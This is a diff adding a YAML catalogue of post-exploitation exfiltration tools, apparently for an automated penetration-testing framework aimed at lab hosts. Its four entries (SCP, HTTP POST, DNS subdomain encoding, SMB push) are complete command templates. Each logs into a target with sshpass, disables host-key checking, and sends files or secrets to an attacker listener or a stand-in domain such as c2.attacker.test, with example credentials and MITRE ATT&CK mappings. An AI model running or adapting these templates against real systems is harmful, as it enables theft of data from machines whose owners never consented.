@@ -1,0 +1,116 @@
+# Exfiltration (TA0010): moving collected data off the target back to the
+# attacker. We model SCP, HTTP POST, and DNS exfil patterns.
+
+tools:
+  - name: scp_exfil_file
+    category: post-exploit
+    description: Pull a file from target to Kali via scp.
+    command_template: "sshpass -p {password} scp -o StrictHostKeyChecking=no -P {port} {user}@{ip}:{remote_path} {local_path}"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: SSH user }
+      - { name: password, type: free_string, description: SSH password }
+      - { name: remote_path, type: file_path, description: file on target }
+      - { name: local_path, type: file_path, description: destination on Kali, default: /tmp/exfil }
+    runtime_cap_seconds: 300
+    output_parser_id: raw
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0010]
+      techniques: [T1041, T1048.002]
+    example_invocation:
+      ip: 10.10.10.5
+      port: 22
+      user: bob
+      password: hunter2
+      remote_path: /tmp/loot.tgz
+      local_path: /tmp/exfil/loot.tgz
+    example_output: ""
+
+  - name: http_post_exfil
+    category: post-exploit
+    description: POST a file from the target to a Kali HTTP listener.
+    command_template: "sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{ip} -p {port} 'curl -s -X POST --data-binary @{remote_path} http://{lhost}:{lport}/upload'"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: SSH user }
+      - { name: password, type: free_string, description: SSH password }
+      - { name: remote_path, type: file_path, description: file on target to upload }
+      - { name: lhost, type: ip, description: Kali listener IP }
+      - { name: lport, type: port, description: Kali listener port, default: 8000 }
+    runtime_cap_seconds: 600
+    output_parser_id: raw
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0010, TA0011]
+      techniques: [T1041, T1048.003]
+    example_invocation:
+      ip: 10.10.10.5
+      port: 22
+      user: bob
+      password: hunter2
+      remote_path: /tmp/loot.tgz
+      lhost: 10.10.14.2
+      lport: 8000
+    example_output: ""
+
+  - name: dns_exfil_short
+    category: post-exploit
+    description: Encode a short payload into DNS subdomains for low-bandwidth exfil.
+    command_template: "sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{ip} -p {port} 'echo {payload} | xxd -p | head -c 60 | xargs -I {{}} dig +short {{}}.{exfil_domain}'"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: SSH user }
+      - { name: password, type: free_string, description: SSH password }
+      - { name: payload, type: free_string, description: short payload (e.g. a flag) }
+      - { name: exfil_domain, type: hostname, description: domain controlled by attacker }
+    runtime_cap_seconds: 60
+    output_parser_id: raw
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0010, TA0011]
+      techniques: [T1048.003, T1071.004]
+    example_invocation:
+      ip: 10.10.10.5
+      port: 22
+      user: bob
+      password: hunter2
+      payload: secret-token-here
+      exfil_domain: c2.attacker.test
+    example_output: ""
+
+  - name: smb_exfil_file
+    category: post-exploit
+    description: Push a file from the target to an attacker-mounted SMB share.
+    command_template: "sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{ip} -p {port} 'smbclient //{lhost}/{share} -U {smbuser}%{smbpass} -c \"put {remote_path}\"'"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: SSH user }
+      - { name: password, type: free_string, description: SSH password }
+      - { name: lhost, type: ip, description: attacker SMB host (Kali) }
+      - { name: share, type: free_string, description: SMB share name on attacker host }
+      - { name: smbuser, type: free_string, description: SMB username for attacker share }
+      - { name: smbpass, type: free_string, description: SMB password for attacker share }
+      - { name: remote_path, type: file_path, description: file on target to push }
+    runtime_cap_seconds: 600
+    output_parser_id: lines
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0010]
+      techniques: [T1048.002]
+    example_invocation:
+      ip: 10.10.10.5
+      port: 22
+      user: bob
+      password: hunter2
+      lhost: 10.10.14.2
+      share: loot
+      smbuser: smb
+      smbpass: smb
+      remote_path: /tmp/loot.tgz
+    example_output: |
+      putting file /tmp/loot.tgz as \loot.tgz (300.5 kb/s)
